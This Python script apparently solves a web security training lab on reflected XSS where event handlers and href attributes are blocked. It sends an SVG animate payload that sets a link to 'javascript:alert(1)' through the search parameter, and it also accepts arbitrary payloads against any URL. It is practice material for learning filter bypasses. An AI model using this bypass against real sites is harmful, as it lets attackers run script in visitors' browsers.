# Reflected XSS with event handlers and href attributes blocked

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('[+] Using payload:\t%s' % payload)
	return r

def send_xss(s, url):
	search_path = url + '/?search='
	xss_payload = """<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>"""
	r = send_payload(s, search_path, urllib.parse.quote(xss_payload))
	return r

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "<test></test>"\t(escaping "$"" as follow: \\$)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Reflected XSS with event handlers and href attributes blocked')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			if payload == "SOLUTION":
				print('[+] Trying send a cross-site scripting attack that calls the alert function...')
				r = send_xss(s, url)
				time.sleep(1)
				if r.status_code == 200 :
					r = s.get(url)
					if  'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved')
					else:
						print('[+] The Exploit sent the given payload !')
			else:
				r = send_payload(s, url + '/?search=', urllib.parse.quote(payload))
				time.sleep(1)
				if r.status_code == 200:
					r = s.get(url)
					if  'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved')
					else:
						print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
